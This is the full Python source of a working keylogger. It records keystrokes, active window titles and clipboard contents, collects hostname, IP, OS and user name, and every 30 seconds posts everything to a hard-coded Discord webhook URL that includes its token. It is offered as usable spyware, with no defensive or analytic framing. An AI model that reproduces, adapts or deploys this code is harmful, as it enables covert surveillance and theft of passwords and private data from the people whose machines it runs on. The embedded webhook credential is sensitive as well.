import os
import platform
import socket
import threading
import time
import requests
import pyperclip
import pygetwindow as gw
from pynput.keyboard import Key, Listener

# --- Configuration ---
# Paste your Discord webhook URL here
WEBHOOK_URL = "https://discord.com/api/webhooks/1393150237832642620/PTpKFxe2BYIJi3L8kr5kF-dGwodylQh74CeKK2mvWYKLS_Onb9NxoJ_Ejenni5hw_oM9"

# Time in seconds to send the log report
LOG_INTERVAL = 30  # Send a report every 120 seconds

# --- Global Variables ---
log_entries = []
last_active_window = ""
last_clipboard_data = ""

def get_system_info():
    """Gathers and formats basic system information for the initial report."""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system_info = (
            f"**Keylogger Session Started**\n"
            f"---------------------------\n"
            f"**Timestamp:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"**Computer Name:** {hostname}\n"
            f"**IP Address:** {ip_address}\n"
            f"**Operating System:** {platform.system()} {platform.version()}\n"
            f"**User:** {os.getlogin()}\n"
            f"---------------------------"
        )
        return system_info
    except Exception as e:
        return f"**Keylogger Session Started**\nCould not retrieve system info: {e}"

def log_event(event_type, content):
    """Adds a structured log entry with a timestamp."""
    global log_entries
    entry = {
        "timestamp": time.strftime('%H:%M:%S'),
        "type": event_type,
        "content": content
    }
    log_entries.append(entry)

def on_press(key):
    """Callback for key press events."""
    try:
        # Only log if key.char is not None to prevent errors
        if key.char:
            log_event("key", key.char)
    except AttributeError:
        # Log special keys in a readable format
        special_key_map = {
            Key.space: " ", Key.enter: "\n", Key.tab: "\t", Key.backspace: "[Bck]",
            Key.delete: "[Del]", Key.shift: "[Shf]", Key.ctrl: "[Ctrl]", Key.alt: "[Alt]"
        }
        key_name = special_key_map.get(key, f"[{key.name}]")
        log_event("key", key_name)

def watch_active_window():
    """Monitors for changes in the active window title and logs them."""
    global last_active_window
    while True:
        try:
            active_window = gw.getActiveWindow()
            window_title = active_window.title if active_window else "None"
            if window_title != last_active_window:
                last_active_window = window_title
                log_event("window", f"Active Window: {window_title}")
        except Exception:
            if last_active_window != "None":
                last_active_window = "None"
                log_event("window", "Active Window: None")
        time.sleep(1)

def watch_clipboard():
    """Monitors for changes in the clipboard and logs them."""
    global last_clipboard_data
    while True:
        try:
            clipboard_data = pyperclip.paste()
            if clipboard_data and clipboard_data != last_clipboard_data:
                last_clipboard_data = clipboard_data
                log_event("clipboard", f"[CLIPBOARD]\n{clipboard_data}")
        except Exception:
            pass
        time.sleep(5)

def format_report():
    """Formats the collected log entries into a readable report."""
    if not log_entries:
        return None

    report_lines = []
    current_line = ""
    for entry in log_entries:
        if entry['type'] == 'key':
            # *** FIX IS HERE: Check if content is not None before adding it ***
            content = entry.get('content')
            if content:
                current_line += content
        else:
            if current_line:
                report_lines.append(f"`{current_line}`")
                current_line = ""
            report_lines.append(f"**`{entry['timestamp']}`** | **{entry['content']}**")
    
    if current_line:
        report_lines.append(f"`{current_line}`")

    return "\n".join(report_lines)

def send_report():
    """Compiles and sends the formatted report to the Discord webhook."""
    global log_entries
    
    report_content = format_report()

    if report_content:
        max_len = 1950 
        chunks = [report_content[i:i+max_len] for i in range(0, len(report_content), max_len)]
        
        for chunk in chunks:
            payload = {
                "content": f"**Keylogger Report - {time.strftime('%Y-%m-%d %H:%M:%S')}**",
                "embeds": [{
                    "description": chunk,
                    "color": 5814783
                }]
            }
            try:
                requests.post(WEBHOOK_URL, json=payload)
            except requests.exceptions.RequestException as e:
                print(f"Error sending report: {e}")

    log_entries = []
    threading.Timer(LOG_INTERVAL, send_report).start()

def main():
    """Main function to initialize and start all monitoring threads."""
    requests.post(WEBHOOK_URL, json={"content": get_system_info()})

    key_listener = Listener(on_press=on_press)
    key_listener.daemon = True
    key_listener.start()

    window_thread = threading.Thread(target=watch_active_window, daemon=True)
    window_thread.start()
    
    clipboard_thread = threading.Thread(target=watch_clipboard, daemon=True)
    clipboard_thread.start()

    send_report()
    key_listener.join()

if __name__ == "__main__":
    main()
